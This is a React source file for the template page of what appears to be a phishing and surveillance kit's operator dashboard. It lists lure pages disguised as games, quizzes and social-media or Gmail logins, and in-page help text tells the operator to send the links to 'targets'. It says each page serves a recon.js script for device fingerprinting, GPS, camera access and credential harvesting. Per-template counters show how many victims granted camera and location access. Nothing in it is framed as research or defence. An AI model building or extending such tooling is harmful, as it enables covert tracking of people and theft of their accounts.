import { useEffect, useState, useMemo } from 'react'
import { api, Template } from '../api/client'

const TEMPLATE_CATEGORIES: Record<string, { label: string; color: string; icon: string }> = {
  game: { label: 'Game', color: '#30d158', icon: '🎮' },
  social: { label: 'Social', color: '#0a84ff', icon: '🔐' },
  psychology: { label: 'Psychology', color: '#bf5af2', icon: '🧠' },
  original: { label: 'Original', color: '#ff9f0a', icon: '📄' },
}

function categorize(id: string): { category: string; label: string; color: string; icon: string } {
  const gameIds = ['face-runner', 'color-match', 'bubble-pop', 'dress-up', 'word-hunt', 'pet-catch']
  const socialIds = ['instagram', 'facebook', 'tiktok', 'whatsapp', 'snapchat', 'gmail']
  const psychIds = ['beauty-quiz', 'horoscope', 'sports-predictor']
  if (gameIds.includes(id)) return { category: 'game', ...TEMPLATE_CATEGORIES.game }
  if (socialIds.includes(id)) return { category: 'social', ...TEMPLATE_CATEGORIES.social }
  if (psychIds.includes(id)) return { category: 'psychology', ...TEMPLATE_CATEGORIES.psychology }
  return { category: 'original', ...TEMPLATE_CATEGORIES.original }
}

const BASE = window.location.origin

export default function Templates() {
  const [templates, setTemplates] = useState<Template[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [search, setSearch] = useState('')
  const [categoryFilter, setCategoryFilter] = useState('')
  const [copiedId, setCopiedId] = useState<string | null>(null)
  const [copiedLink, setCopiedLink] = useState<string | null>(null)

  useEffect(() => {
    api.templates()
      .then(setTemplates)
      .catch(e => setError(e instanceof Error ? e.message : 'Failed to load'))
      .finally(() => setLoading(false))
  }, [])

  const categories = useMemo(() => {
    const cats = new Set(templates.map(t => categorize(t.id).category))
    return ['', ...Array.from(cats)]
  }, [templates])

  const filtered = useMemo(() => {
    return templates.filter(t => {
      if (categoryFilter && categorize(t.id).category !== categoryFilter) return false
      if (!search) return true
      const q = search.toLowerCase()
      return t.id.toLowerCase().includes(q) || t.name.toLowerCase().includes(q) || (t.description ?? '').toLowerCase().includes(q)
    })
  }, [templates, search, categoryFilter])

  const copyLink = async (t: Template) => {
    const link = `${BASE}/t/${t.id}`
    await navigator.clipboard.writeText(link)
    setCopiedId(t.id)
    setTimeout(() => setCopiedId(null), 1500)
  }

  const copyDashboardLink = async () => {
    const code = new URLSearchParams(window.location.search).get('code') || ''
    const link = `${BASE}/?code=${code}#/templates`
    await navigator.clipboard.writeText(link)
    setCopiedLink(link)
    setTimeout(() => setCopiedLink(null), 1500)
  }

  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>

  if (error) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center space-y-3">
          <div className="text-4xl">⚠️</div>
          <p className="text-sm text-tertiary">{error}</p>
          <button onClick={() => { setLoading(true); setError(null); api.templates().then(setTemplates).catch(e => setError(e instanceof Error ? e.message : 'Failed to load')).finally(() => setLoading(false)) }}
            className="px-4 py-2 text-sm accent-bg accent radius-sm">Retry</button>
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-4 stagger">
      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Templates</h1>
          <p className="text-sm text-tertiary mt-0.5">{templates.length} templates · {filtered.length} shown</p>
        </div>
        <div className="flex items-center gap-2">
          <button onClick={copyDashboardLink}
            className="select-apple cursor-pointer text-xs">
            {copiedLink ? '✓ Copied!' : '🔗 Copy Dashboard Link'}
          </button>
          <button onClick={() => { setLoading(true); setError(null); api.templates().then(setTemplates).catch(e => setError(e instanceof Error ? e.message : 'Failed to load')).finally(() => setLoading(false)) }}
            className="select-apple cursor-pointer">⟳</button>
        </div>
      </div>

      <div className="content-card">
        <p className="text-xs text-tertiary leading-relaxed">
          Templates are self-contained HTML pages in the <code className="mono accent px-1 radius-sm">templates/</code> directory.
          Share a template link with targets — each serves <code className="mono accent px-1 radius-sm">recon.js</code> for device fingerprinting,
          GPS, camera, and credential harvesting.
        </p>
      </div>

      <div className="flex gap-2 flex-wrap">
        {categories.map(cat => (
          <button key={cat}
            onClick={() => setCategoryFilter(cat)}
            className={`text-xs px-3 py-1.5 radius-sm transition-colors cursor-pointer
              ${categoryFilter === cat ? 'accent-bg accent' : 'bg-tertiary text-secondary hover:text-primary'}`}>
            {cat ? `${TEMPLATE_CATEGORIES[cat]?.icon || ''} ${TEMPLATE_CATEGORIES[cat]?.label || cat}` : 'All'}
          </button>
        ))}
      </div>

      <input
        type="text"
        placeholder="Search templates by name, ID, or description..."
        value={search}
        onChange={e => setSearch(e.target.value)}
        className="input-apple"
      />

      {filtered.length === 0 ? (
        <div className="empty-state animate-fade-in">
          <div className="icon">📋</div>
          <h3>{search ? 'No matches' : 'No templates available'}</h3>
          <p>{search ? 'Try a different search term' : 'Add .html files to the templates/ directory and restart'}</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {filtered.map((t, i) => {
            const cat = categorize(t.id)
            return (
              <div key={t.id} className="stat-card animate-scale-in flex flex-col"
                style={{ animationDelay: `${i * 0.04}s`, animationFillMode: 'both' }}>
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-2 min-w-0">
                    <span className="text-xl">{cat.icon}</span>
                    <div className="min-w-0">
                      <h3 className="text-sm font-semibold text-primary truncate">{t.name}</h3>
                      <code className="text-xs accent mono truncate block">/t/{t.id}</code>
                    </div>
                  </div>
                  <span className="badge shrink-0 ml-2"
                    style={{ backgroundColor: cat.color + '18', color: cat.color }}>
                    {cat.label}
                  </span>
                </div>

                {t.description && (
                  <p className="text-xs text-tertiary mt-2 leading-relaxed line-clamp-2">{t.description}</p>
                )}

                <div className="flex gap-2 mt-3 flex-wrap">
                  <a href={`/t/${t.id}`} target="_blank" rel="noreferrer"
                    className="flex-1 text-center text-xs accent-bg accent radius-card py-1.5 transition-colors hover:bg-accent min-w-[70px]">
                    Preview ↗
                  </a>
                  <button onClick={() => copyLink(t)}
                    className="flex-1 text-center text-xs bg-tertiary text-secondary radius-card py-1.5 transition-colors hover:text-primary min-w-[70px]">
                    {copiedId === t.id ? '✓ Copied!' : '📋 Copy Link'}
                  </button>
                </div>

                {t.total_served !== undefined && (
                  <div className="flex gap-3 mt-3 pt-3 border-t border-subtle">
                    <div className="flex-1 text-center">
                      <div className="text-xs text-tertiary">Served</div>
                      <div className="text-sm mono text-primary font-semibold">{t.total_served}</div>
                    </div>
                    <div className="flex-1 text-center">
                      <div className="text-xs text-tertiary">Camera</div>
                      <div className="text-sm mono text-primary font-semibold">{t.total_camera_grants ?? 0}</div>
                    </div>
                    <div className="flex-1 text-center">
                      <div className="text-xs text-tertiary">Location</div>
                      <div className="text-sm mono text-primary font-semibold">{t.total_location_grants ?? 0}</div>
                    </div>
                  </div>
                )}

                <div className="text-xs text-tertiary mt-3 pt-2 border-t border-subtle text-center">
                  Created {new Date(t.created_at * 1000).toLocaleDateString()}
                </div>
              </div>
            )
          })}
        </div>
      )}
    </div>
  )
}